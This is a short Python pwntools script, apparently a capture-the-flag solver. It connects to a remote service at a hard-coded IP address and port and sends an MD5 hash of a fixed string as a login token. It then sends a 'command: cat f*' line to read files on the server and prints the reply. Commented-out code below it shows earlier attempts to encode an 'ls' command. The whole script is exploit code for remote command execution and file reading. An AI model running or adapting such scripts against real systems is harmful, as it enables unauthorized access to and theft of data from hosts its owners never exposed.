from pwn import *

p = hashlib.md5(b's4v3_th3_w0rld').hexdigest().encode()
print(p.decode("utf-8"))
conn = remote('138.68.141.182', 32205)
conn.send(p.decode("utf-8"))
conn.send('f')
conn.send("command: cat f*");
print(conn.recv())

# command = b'command:ls'
# little = int.from_bytes(b'command:ls', byteorder='little')
#  size = len(command)
# s = 2048
# print(int.from_bytes(s.to_bytes(2, "little"), byteorder='little'))
# conn.send(s.to_bytes(2, "little"))
# #c = int.to_bytes(little, length=size)
# enc = hashlib.md5(command).hexdigest().encode(encoding='utf-8')
# 
# conn.send(command)
# print(conn.recv())
# conn.close()
